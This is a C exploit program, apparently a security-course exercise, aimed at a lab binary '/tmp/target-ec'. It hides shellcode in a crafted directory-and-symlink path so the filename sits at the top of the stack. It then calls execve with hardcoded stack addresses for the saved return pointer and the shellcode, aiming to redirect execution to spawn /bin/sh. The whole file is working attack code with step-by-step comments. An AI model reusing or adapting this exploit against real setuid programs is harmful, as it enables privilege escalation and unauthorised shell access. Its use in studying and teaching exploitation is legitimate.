#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include <sys/stat.h>

#define TARGET "/tmp/target-ec"

int main(void)
{
  char *args[4];
  char *env[1];

  /* At a high level, we'll do the following: create a symlink
     whose path in the shellcode and call exec on that. Since
     the executable filename is loaded as the first thing on the
     stack (see README for references on ELF stack loading), we
     can then jump to that code even though the args are zeroed
     out. The devil, of course, is in the details. */

  /* First: Create a folder that contains all shellcode up to the
     first slash in that code (ie, up to /bin/sh exclusive). */
  char folder1[39];
  memcpy (folder1, shellcode, 38);
  folder1[38] = 0;
  mkdir (folder1, S_IXUSR | S_IWUSR | S_IRUSR);

  /* Second: Create a subdirectory of the first called 'bin'. */
  char folder2[44];
  memcpy (folder2, shellcode, 43);
  folder2[43] = 0;
  mkdir (folder2, S_IXUSR | S_IWUSR | S_IRUSR);

  /* Third: Create a symlink called 'sh' in that folder. Now the full
     path from here to 'sh' is exactly the shellcode. NB: there is one
     tricky detail. The shellcode actual writes to memory up to 4 bytes
     above where it is. This is normally not an issue, but since we're
     placing the shellcode at the very top of the stack, any writes past
     the end segfault. Thus, the filename is padded with four spaces at
     the end so that we get four extra bytes of room without affecting
     the call itself. */
  char symlink_path[50];
  memcpy (symlink_path, shellcode, strlen (shellcode));
  strcpy (symlink_path + 45, "    ");

  /* Link our shellcode-path to the target */
  symlink (TARGET, symlink_path);

  /* p1 is location of saved eip (be sure to skip the dummy frame), and
     p2 is location of shellcode. */
  char *p1 = "0xbffffe2c";
  char *p2 = "0xbfffffca";

  args[0] = TARGET; args[1] = p1; args[2] = p2; args[3] = NULL;
  env[0] = NULL;

  /* Call execve on the symlink, not the target. */
  if (0 > execve(symlink_path, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
